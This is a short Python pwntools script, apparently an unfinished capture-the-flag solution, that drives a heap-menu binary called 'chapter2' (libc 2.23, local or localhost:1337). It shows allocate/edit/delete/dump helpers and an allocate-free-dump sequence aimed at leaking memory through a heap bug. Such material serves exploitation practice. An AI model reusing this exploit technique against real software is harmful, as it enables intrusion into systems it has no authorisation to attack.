#!/usr/bin/env python3
from pwn import *
#context.log_level='DEBUG'

p = process("./chapter2", env={"LD_PRELOAD": "./libc-2.23.so"})
elf = ELF("./chapter2", checksec=False)
libc = elf.libc
rop = ROP(elf)

def start():
	if not args.REMOTE:
		return process("./chapter2")
	else:
		return remote("localhost", 1337)

p = start()

def main():

	global rop

	def allocate(size, data):
		p.sendlineafter(">> ", "1")
		p.sendlineafter("Size: ", size)
		p.sendlineafter("Data: ", data)

	def edit(idx, data):
		p.sendlineafter(">> ", "2")
		p.sendlineafter("Index: ", str(idx))
		p.sendlineafter("Data: ", data)

	def delete(idx):
		p.sendlineafter(">> ", "3")
		p.sendlineafter("Index: ", str(idx))

	def dump(idx):
		p.sendlineafter(">> ", "4")
		p.sendlineafter("Index: ", str(idx))
		data = p.recvline()
		print(p.recv(4))

	pause()
	allocate("18", b"AAAAA") # 0
	allocate("30", b"BBBBB") # 1
	allocate("18", b"CCCCC") # 2
	delete(0)
	delete(1)

	allocate("16", b"AAAAAAA") # 3
	dump(0)

	p.interactive()

if __name__=="__main__":
	main()
